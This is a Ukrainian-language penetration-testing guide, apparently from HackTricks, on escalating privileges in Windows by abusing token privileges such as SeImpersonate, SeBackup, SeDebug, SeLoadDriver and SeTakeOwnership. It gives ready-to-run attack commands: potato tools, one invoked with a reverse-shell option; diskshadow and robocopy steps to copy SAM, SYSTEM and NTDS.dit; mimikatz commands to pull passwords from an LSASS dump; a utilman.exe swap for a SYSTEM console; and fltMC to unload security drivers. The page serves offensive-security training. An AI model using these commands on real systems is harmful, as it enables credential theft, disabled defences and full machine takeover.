# Зловживання токенами

{{#include ../../banners/hacktricks-training.md}}

## Токени

Якщо ви **не знаєте, що таке Windows Access Tokens**, прочитайте цю сторінку перед продовженням:


{{#ref}}
access-tokens.md
{{#endref}}

**Ви можете підвищити привілеї, зловживаючи токенами, які вже маєте.**

### SeImpersonatePrivilege

Цей привілей дозволяє процесу видати себе за інший (але не створювати) токен, якщо він може отримати handle до цього токена. Привілейований токен можна отримати від Windows service (DCOM), змусивши його виконати NTLM authentication проти exploit, після чого стає можливим запуск процесу з привілеями SYSTEM.<sup>[[2]](#references)</sup> Цю primitive можна використати за допомогою таких інструментів, як [JuicyPotato](https://github.com/ohpe/juicy-potato), [RogueWinRM](https://github.com/antonioCoco/RogueWinRM) (для якого WinRM має бути вимкнено), [SweetPotato](https://github.com/CCob/SweetPotato) і [PrintSpoofer](https://github.com/itm4n/PrintSpoofer).

Сучасні примітки для операторів:

- **JuicyPotato є застарілим**: у Windows 10 1809+/Server 2019+ надавайте перевагу **GodPotato**, **SigmaPotato**, **PrintNotifyPotato**, **RoguePotato**, **SharpEfsPotato/EfsPotato** або **PrintSpoofer** — залежно від того, яка RPC/COM surface усе ще доступна.
- Якщо ви скомпрометували service, що працює від імені **`LOCAL SERVICE`** або **`NETWORK SERVICE`**, і `whoami /priv` показує **filtered token** без `SeImpersonatePrivilege`/`SeAssignPrimaryTokenPrivilege`, спочатку відновіть **default privilege set** облікового запису (наприклад, за допомогою **FullPowers**), а потім повторно спробуйте інструменти з **potato family**.<sup>[[3]](#references)</sup>
- Деякі новіші forks зручніші для операторів, ніж оригінальні інструменти. Наприклад, **SigmaPotato** додає reflection/in-memory execution і сумісність із сучасними версіями Windows, тоді як **PrintNotifyPotato** зловживає PrintNotify COM service і часто корисний, коли класичний шлях через Spooler вимкнено.
```cmd
FullPowers.exe -c "cmd /c whoami /priv" -z
GodPotato.exe -cmd "cmd /c whoami"
SigmaPotato.exe --revshell <ip> <port>
PrintNotifyPotato.exe whoami
```
{{#ref}}
roguepotato-and-printspoofer.md
{{#endref}}


{{#ref}}
juicypotato.md
{{#endref}}

### SeAssignPrimaryPrivilege

Це дуже схоже на **SeImpersonatePrivilege**: буде використано **той самий метод** для отримання привілейованого токена.\
Після цього цей привілей дозволяє **призначити первинний токен** новому або призупиненому процесу. За допомогою привілейованого токена імперсонації можна створити первинний токен (DuplicateTokenEx).\
Маючи цей токен, можна створити **новий процес** за допомогою 'CreateProcessAsUser' або створити призупинений процес і **встановити токен** (зазвичай не можна змінити первинний токен уже запущеного процесу).<sup>[[2]](#references)</sup>

### SeTcbPrivilege

Якщо цей токен увімкнено, можна використати **KERB_S4U_LOGON**, щоб отримати **токен імперсонації** для будь-якого іншого користувача без знання облікових даних, **додати довільну групу** (admins) до токена, встановити **рівень цілісності** токена на "**medium**" і призначити цей токен **поточному потоку** (SetThreadToken).<sup>[[2]](#references)</sup>

### SeBackupPrivilege

Цей привілей змушує систему **надавати повний доступ на читання** до будь-якого файлу (обмежений операціями читання). Він використовується для **читання хешів паролів локальних облікових записів Administrator** із реєстру, після чого такі інструменти, як "**psexec**" або "**wmiexec**", можна використовувати з цим хешем (техніка Pass-the-Hash). Однак ця техніка не працює за двох умов: якщо обліковий запис Local Administrator вимкнено або якщо діє політика, яка вилучає адміністративні права у Local Administrators, що підключаються віддалено.<sup>[[2]](#references)</sup>\
На практиці найнадійнішим вбудованим workflow зазвичай є **VSS + `robocopy /b`**: створити або відкрити тіньову копію, а потім скопіювати `SAM`/`SYSTEM` або `NTDS.dit` у **режимі резервного копіювання**, що обходить ACL файлів.<sup>[[4]](#references)</sup>
```cmd
:: shadow.txt
set context persistent nowriters
add volume c: alias tk
create
expose %tk% z:

:: then copy sensitive files from the snapshot
diskshadow /s shadow.txt
robocopy /b z:\Windows\System32\Config C:\temp SAM SYSTEM SECURITY
robocopy /b z:\Windows\NTDS C:\temp ntds.dit
```
Ви можете **зловживати цим привілеєм** за допомогою:

- [https://github.com/Hackplayers/PsCabesha-tools/blob/master/Privesc/Acl-FullControl.ps1](https://github.com/Hackplayers/PsCabesha-tools/blob/master/Privesc/Acl-FullControl.ps1)
- [https://github.com/giuliano108/SeBackupPrivilege/tree/master/SeBackupPrivilegeCmdLets/bin/Debug](https://github.com/giuliano108/SeBackupPrivilege/tree/master/SeBackupPrivilegeCmdLets/bin/Debug)
- стежачи за **IppSec** у [https://www.youtube.com/watch?v=IfCysW0Od8w\&t=2610\&ab_channel=IppSec](https://www.youtube.com/watch?v=IfCysW0Od8w&t=2610&ab_channel=IppSec)
- Або як пояснюється в розділі **ескалації привілеїв за допомогою Backup Operators** у:


{{#ref}}
../active-directory-methodology/privileged-groups-and-token-privileges.md
{{#endref}}

### SeRestorePrivilege

Цей привілей надає дозвіл на **доступ для запису** до будь-якого системного файлу незалежно від його Access Control List (ACL). Він відкриває численні можливості для ескалації, зокрема можливість **змінювати служби**, виконувати DLL Hijacking і встановлювати **debuggers** через Image File Execution Options, а також застосовувати багато інших технік.<sup>[[2]](#references)</sup>

### SeCreateTokenPrivilege

SeCreateTokenPrivilege — це потужний дозвіл, особливо корисний, коли користувач має можливість імперсонувати токени, але також і за відсутності SeImpersonatePrivilege. Ця можливість залежить від здатності імперсонувати токен, який представляє того самого користувача і чий рівень цілісності не перевищує рівень цілісності поточного процесу.<sup>[[2]](#references)</sup>

**Ключові моменти:**

- **Імперсонація без SeImpersonatePrivilege:** SeCreateTokenPrivilege можна використати для EoP, імперсонуючи токени за певних умов.
- **Умови імперсонації токена:** успішна імперсонація вимагає, щоб цільовий токен належав тому самому користувачеві та мав рівень цілісності, менший або рівний рівню цілісності процесу, який виконує імперсонацію.
- **Створення та модифікація токенів імперсонації:** користувачі можуть створити токен імперсонації та посилити його, додавши SID (Security Identifier) привілейованої групи.

### SeLoadDriverPrivilege

Цей привілей дозволяє процесу **завантажувати та вивантажувати драйвери пристроїв**, створюючи запис реєстру з певними значеннями `ImagePath` і `Type`. Оскільки прямий доступ для запису до `HKLM` (HKEY_LOCAL_MACHINE) обмежений, натомість можна використовувати `HKCU` (HKEY_CURRENT_USER). Однак потрібен певний шлях, щоб ядро розпізнало запис у `HKCU` як конфігурацію драйвера.<sup>[[2]](#references)</sup>

Сучасне offensive use зазвичай полягає у **BYOVD** (bring your own vulnerable driver): завантажити **підписаний, але вразливий** драйвер ядра, а потім використати його IOCTL, щоб вимкнути захист або перейти до виконання коду в ядрі. Зверніть увагу, що в нових збірках Windows 11/Server **Microsoft vulnerable driver blocklist** та/або **HVCI/Memory Integrity** часто блокують старі public chains, тому класичні приклади на кшталт `szkg64.sys` більше не є універсально надійними.

Цей шлях має вигляд `\Registry\User\<RID>\System\CurrentControlSet\Services\DriverName`, де `<RID>` — Relative Identifier поточного користувача. У `HKCU` потрібно створити весь цей шлях і встановити два значення:<sup>[[2]](#references)</sup>

- `ImagePath`, тобто шлях до бінарного файлу, який потрібно виконати
- `Type` зі значенням `SERVICE_KERNEL_DRIVER` (`0x00000001`).

**Виконайте такі кроки:**

1. Отримайте доступ до `HKCU` замість `HKLM` через обмежений доступ для запису.
2. Створіть у `HKCU` шлях `\Registry\User\<RID>\System\CurrentControlSet\Services\DriverName`, де `<RID>` — Relative Identifier поточного користувача.
3. Встановіть для `ImagePath` шлях виконання бінарного файлу.
4. Призначте для `Type` значення `SERVICE_KERNEL_DRIVER` (`0x00000001`).
```python
# Example Python code to set the registry values
import winreg as reg

# Define the path and values
path = r'Software\YourPath\System\CurrentControlSet\Services\DriverName' # Adjust 'YourPath' as needed
key = reg.OpenKey(reg.HKEY_CURRENT_USER, path, 0, reg.KEY_WRITE)
reg.SetValueEx(key, "ImagePath", 0, reg.REG_SZ, "path_to_binary")
reg.SetValueEx(key, "Type", 0, reg.REG_DWORD, 0x00000001)
reg.CloseKey(key)
```
Більше способів зловживання цим privilege наведено в [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges#seloaddriverprivilege](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges#seloaddriverprivilege)

### SeTakeOwnershipPrivilege

Це подібно до **SeRestorePrivilege**. Його основна функція дає процесу змогу **отримати право власності на об’єкт**, обходячи вимогу явного discretionary access завдяки наданню прав доступу WRITE_OWNER. Процес передбачає спочатку отримання права власності на потрібний registry key для запису, а потім зміну DACL для забезпечення операцій запису.<sup>[[2]](#references)</sup>
```bash
takeown /f 'C:\some\file.txt' #Now the file is owned by you
icacls 'C:\some\file.txt' /grant <your_username>:F #Now you have full access
# Use this with files that might contain credentials such as
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software
%WINDIR%\repair\security
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
c:\inetpub\wwwwroot\web.config
```
### SeDebugPrivilege

Цей привілей дає змогу **налагоджувати інші процеси**, зокрема читати пам'ять і записувати до неї. За наявності цього привілею можна застосовувати різні стратегії ін'єкції в пам'ять, здатні обходити більшість антивірусних рішень і рішень для запобігання вторгненням на хості.<sup>[[2]](#references)</sup>

У сучасних версіях Windows пам'ятайте, що `SeDebugPrivilege` зазвичай достатньо, щоб відкрити **незахищені SYSTEM-процеси** та дублювати їхні токени, але це **не гарантує**, що ви зможете взаємодіяти з **LSASS**. Якщо ввімкнено **RunAsPPL / LSA Protection**, незахищені процеси не можуть читати пам'ять LSASS або виконувати ін'єкції в нього, навіть якщо присутній `SeDebugPrivilege`. У такому разі викрадіть токен з іншого SYSTEM-процесу, який не працює під PPL, або використайте ланцюжок із PPL bypass/BYOVD, замість того щоб припускати, що `procdump` працюватиме. Повний приклад копіювання токена з використанням `SeDebugPrivilege` + `SeImpersonatePrivilege` наведено на [цій сторінці](sedebug-+-seimpersonate-copy-token.md).

#### Дамп пам'яті

Для **отримання дампу пам'яті процесу** можна використати [ProcDump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump) із [SysInternals Suite](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite). Зокрема, це можна застосувати до процесу **Local Security Authority Subsystem Service (**[**LSASS**](https://en.wikipedia.org/wiki/Local_Security_Authority_Subsystem_Service)**)**, який відповідає за зберігання облікових даних користувачів після їхнього успішного входу в систему.

Потім цей дамп можна завантажити в mimikatz, щоб отримати паролі:
```
mimikatz.exe
mimikatz # log
mimikatz # sekurlsa::minidump lsass.dmp
mimikatz # sekurlsa::logonpasswords
```
#### RCE

Якщо ви хочете отримати shell `NT SYSTEM`, можна використати:

- [**SeDebugPrivilege-Exploit (C++)**](https://github.com/bruno-1337/SeDebugPrivilege-Exploit)
- [**SeDebugPrivilegePoC (C#)**](https://github.com/daem0nc0re/PrivFu/tree/main/PrivilegedOperations/SeDebugPrivilegePoC)
- [**psgetsys.ps1 (Powershell Script)**](https://raw.githubusercontent.com/decoder-it/psgetsystem/master/psgetsys.ps1)
```bash
# Get the PID of a process running as NT SYSTEM
import-module psgetsys.ps1; [MyProcess]::CreateProcessFromParent(<system_pid>,<command_to_execute>)
```
### SeManageVolumePrivilege

Це право (виконання завдань з обслуговування томів) дозволяє відкривати дескриптори пристроїв необроблених томів (наприклад, \\.\C:) для прямого дискового вводу/виводу в обхід ACL NTFS. За його наявності можна копіювати байти будь-якого файлу на томі, читаючи базові блоки, що дає змогу довільно читати чутливі файли (наприклад, приватні ключі комп’ютера в %ProgramData%\Microsoft\Crypto\, кущі реєстру, SAM/NTDS через VSS).<sup>[[5]](#references)</sup> Це особливо небезпечно для серверів CA, оскільки викрадення приватного ключа CA дозволяє створити Golden Certificate для видавання себе за будь-який principal.<sup>[[6]](#references)</sup>

Див. докладні техніки та заходи пом’якшення:

{{#ref}}
semanagevolume-perform-volume-maintenance-tasks.md
{{#endref}}

## Перевірка привілеїв
```
whoami /priv
```
**Токени, позначені як Disabled**, зазвичай можна ввімкнути, тому часто можна зловживати як _Enabled_, так і _Disabled_ привілеями.

### Увімкнення всіх токенів

Якщо у вас є вимкнені привілеї, ви можете використати скрипт [**EnableAllTokenPrivs.ps1**](https://raw.githubusercontent.com/fashionproof/EnableAllTokenPrivs/master/EnableAllTokenPrivs.ps1), щоб увімкнути всі токени:
```bash
.\EnableAllTokenPrivs.ps1
whoami /priv
```
Або **скрипт**, вбудований у цей [**допис**](https://www.leeholmes.com/adjusting-token-privileges-in-powershell/).

## Таблиця

Повна шпаргалка з привілеїв токенів доступна за адресою [https://github.com/gtworek/Priv2Admin](https://github.com/gtworek/Priv2Admin); наведений нижче короткий огляд містить лише безпосередні способи використання привілею для отримання сеансу адміністратора або читання конфіденційних файлів.<sup>[[1]](#references)</sup>

| Привілей                  | Вплив      | Інструмент                    | Шлях виконання                                                                                                                                                                                                                                                                                                                                     | Примітки                                                                                                                                                                                                                                                                                                                        |
| -------------------------- | ----------- | ----------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| **`SeAssignPrimaryToken`** | _**Admin**_ | сторонній інструмент          | _"Це дає користувачу змогу видати себе за токени та виконати privesc до nt system за допомогою таких інструментів, як potato.exe, rottenpotato.exe і juicypotato.exe"_                                                                                                                                                                                                      | Дякую [Aurélien Chalot](https://twitter.com/Defte_) за оновлення. Незабаром я спробую переформулювати це у більш схожий на рецепт формат.                                                                                                                                                                                         |
| **`SeBackup`**             | **Загроза**  | _**вбудовані команди**_ | Читати конфіденційні файли за допомогою `robocopy /b` або спеціалізованих допоміжних засобів копіювання, що підтримують SeBackup.                                                                                                                                                                                                                                                                 | <p>- Чудово підходить для `SAM`/`SYSTEM`, `SECURITY`, `NTDS.dit` і, іноді, `%WINDIR%\MEMORY.DMP`.<br><br>- `robocopy` зручний, але спеціалізовані cmdlet/API SeBackup часто забезпечують більшу гнучкість під час роботи із заблокованими або відкритими файлами.</p>                                                                                                   |
| **`SeCreateToken`**        | _**Admin**_ | сторонній інструмент          | Створити довільний токен, зокрема з локальними правами адміністратора, за допомогою `NtCreateToken`.                                                                                                                                                                                                                                                                          |                                                                                                                                                                                                                                                                                                                                |
| **`SeDebug`**              | _**Admin**_ | **PowerShell**          | Дублювати токен SYSTEM, що належить **не-PPL** процесу, або видобути пам’ять із незахищеного процесу.                                                                                                                                                                                                                                                                 | <p>Видобування LSASS зазвичай блокується, якщо ввімкнено RunAsPPL/LSA Protection.</p><p>Скрипт доступний у [FuzzySecurity](https://github.com/FuzzySecurity/PowerShell-Suite/blob/master/Conjure-LSASS.ps1)</p>                                                                                                               |
| **`SeImpersonate`**        | _**Admin**_ | сторонній інструмент          | Використовувати **сімейство Potato** / impersonation через іменований канал для запуску SYSTEM (`PrintSpoofer`, `RoguePotato`, `GodPotato`, `SigmaPotato`, `PrintNotifyPotato` тощо).                                                                                                                                                                                    | <p>Найпрактичніше для сервісних облікових записів, таких як IIS APPPOOL, MSSQL, заплановані завдання, або будь-якого контексту, який уже має `SeImpersonatePrivilege`.</p>                                                                                                                                                                            |
| **`SeLoadDriver`**         | _**Admin**_ | сторонній інструмент          | <p>1. Завантажити підписаний, але вразливий kernel driver (BYOVD)<br>2. Використати IOCTL драйвера для отримання kernel R/W, вимкнення засобів безпеки або підвищення привілеїв до SYSTEM<br><br>Альтернативно, цей привілей можна використати для вивантаження драйверів, пов’язаних із безпекою, за допомогою вбудованої команди <code>fltMC</code>, тобто <code>fltMC sysmondrv</code></p>                     | <p>Старіші публічні драйвери, такі як <code>szkg64.sys</code>, дедалі частіше блокуються в сучасних Windows списком заблокованих вразливих драйверів / HVCI.</p>                                                                                                                                                                               |
| **`SeRestore`**            | _**Admin**_ | **PowerShell**          | <p>1. Запустити PowerShell/ISE із наявним привілеєм SeRestore.<br>2. Увімкнути привілей за допомогою <a href="https://github.com/gtworek/PSBits/blob/master/Misc/EnableSeRestorePrivilege.ps1">Enable-SeRestorePrivilege</a>).<br>3. Перейменувати utilman.exe на utilman.old<br>4. Перейменувати cmd.exe на utilman.exe<br>5. Заблокувати консоль і натиснути Win+U</p> | <p>Атаку можуть виявити деякі AV-програми.</p><p>Альтернативний метод полягає в заміні бінарних файлів служб, що зберігаються в "Program Files", за допомогою того самого привілею.</p>                                                                                                                                                            |
| **`SeTakeOwnership`**      | _**Admin**_ | _**вбудовані команди**_ | <p>1. <code>takeown.exe /f "%windir%\system32"</code><br>2. <code>icacls.exe "%windir%\system32" /grant "%username%":F</code><br>3. Перейменувати cmd.exe на utilman.exe<br>4. Заблокувати консоль і натиснути Win+U</p>                                                                                                                                       | <p>Атаку можуть виявити деякі AV-програми.</p><p>Альтернативний метод полягає в заміні бінарних файлів служб, що зберігаються в "Program Files", за допомогою того самого привілею.</p>                                                                                                                                                           |
| **`SeTcb`**                | _**Admin**_ | сторонній інструмент          | <p>Маніпулювати токенами, щоб додати до них локальні права адміністратора. Може потребувати SeImpersonate.</p><p>Потребує перевірки.</p>                                                                                                                                                                                                                                     |                                                                                                                                                                                                                                                                                                                                |

## References

- [1] [gtworek/Priv2Admin - шляхи експлуатації від привілеїв Windows до адміністратора](https://github.com/gtworek/Priv2Admin)
- [2] [Зловживання привілеями токенів для LPE](https://github.com/hatRiot/token-priv/blob/master/abusing_token_eop_1.0.txt)
- [3] [itm4n – Поверніть мені мої привілеї! Будь ласка?](https://itm4n.github.io/localservice-privileges/)
- [4] [Microsoft – Robocopy (`/b` режим резервного копіювання обходить перевірки ACL файлів/папок)](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/robocopy)
- [5] [Microsoft – Виконання завдань з обслуговування томів (SeManageVolumePrivilege)](https://learn.microsoft.com/previous-versions/windows/it-pro/windows-10/security/threat-protection/security-policy-settings/perform-volume-maintenance-tasks)
- [6] [0xdf – HTB: Certificate (SeManageVolumePrivilege → ексфільтрація ключа CA → Golden Certificate)](https://0xdf.gitlab.io/2025/10/04/htb-certificate.html)
{{#include ../../banners/hacktricks-training.md}}
